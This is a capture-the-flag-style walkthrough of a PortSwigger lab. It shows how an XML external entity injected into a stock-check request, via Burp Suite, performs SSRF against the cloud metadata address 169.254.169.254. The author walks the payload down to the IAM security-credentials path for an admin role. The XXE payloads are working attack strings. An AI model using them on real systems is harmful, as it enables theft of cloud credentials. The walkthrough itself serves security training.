---
description: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
---

# Exploiting XXE to perform SSRF attacks

<figure><img src="../../../.gitbook/assets/1 (157).png" alt=""><figcaption></figcaption></figure>

Let's check the stock of one of the products.

<figure><img src="../../../.gitbook/assets/2 (10).png" alt=""><figcaption></figcaption></figure>

Since we are proxying the requests through Burp Suite, we can go to `Proxy > HTTP History` to view the request.

<figure><img src="../../../.gitbook/assets/3 (10).png" alt=""><figcaption></figcaption></figure>

We can see that the request contains an XML entity.

Let's forward this request to the `Repeater` for further modification.

Once in the `Repeater` tab, declare the following internal entity after the XML prologue:

```
<!DOCTYPE test 
	[<!ENTITY test SYSTEM "http://169.254.169.254/">]
>
```

<figure><img src="../../../.gitbook/assets/4 (7).png" alt=""><figcaption></figcaption></figure>

Let's add the `latest` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/">]
```

<figure><img src="../../../.gitbook/assets/5 (8).png" alt=""><figcaption></figcaption></figure>

Let's add the `meta-data` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]
```

<figure><img src="../../../.gitbook/assets/6 (6).png" alt=""><figcaption></figcaption></figure>

Let's add the `iam` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/">]
```

<figure><img src="../../../.gitbook/assets/7 (5).png" alt=""><figcaption></figcaption></figure>

Let's add the `credentials` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]
```

<figure><img src="../../../.gitbook/assets/8 (1).png" alt=""><figcaption></figcaption></figure>

Let's add the `admin` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/">]
```

<figure><img src="../../../.gitbook/assets/9 (2).png" alt=""><figcaption></figcaption></figure>

We have solved the lab.

<figure><img src="../../../.gitbook/assets/10 (2).png" alt=""><figcaption></figcaption></figure>
